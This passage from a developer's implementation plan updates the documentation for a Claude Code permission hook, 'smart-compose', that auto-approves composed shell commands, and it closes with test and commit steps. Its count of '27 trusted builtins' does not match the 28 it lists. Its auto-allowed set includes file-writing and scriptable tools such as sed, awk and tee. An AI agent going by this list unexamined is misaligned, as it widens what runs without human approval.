- **Must be last in the array** — if other deny-capable hooks exist (e.g., `dangerous-command-blocker`, `git-conventions`), they must appear earlier so they can block before smart-compose approves
- Reads allow rules from: project `.claude/settings.local.json` and `.claude/settings.json` + global `~/.claude/settings.local.json` and `~/.claude/settings.json`
- **Variable assignments** (`VAR=value`) are recognized and checked against prefix rules ending with `=` (e.g., `Bash(MERGE_BASE=:*)`)
- **Command substitution** (`$(cmd)`) inside variable values and builtin arguments is recursively checked — the inner command must also match an allow rule
- **27 trusted builtins** are auto-allowed in composed commands: `cd`, `echo`, `printf`, `true`, `false`, `test`, `[`, `[[`, `cp`, `mv`, `mkdir`, `touch`, `cat`, `head`, `tail`, `wc`, `less`, `awk`, `sed`, `grep`, `sort`, `uniq`, `tee`, `basename`, `dirname`, `realpath`, `date`, `sleep`
```

**Step 2: Run full test suite one final time**

Run: `cd /Users/willvargas/Development/Sheetgo/agent-skills && python3 -m pytest tests/ -v`
Expected: all PASSED

**Step 3: Commit**

```bash
git add CLAUDE.md
git commit -m "docs: Update smart-compose documentation with v2 capabilities"
```
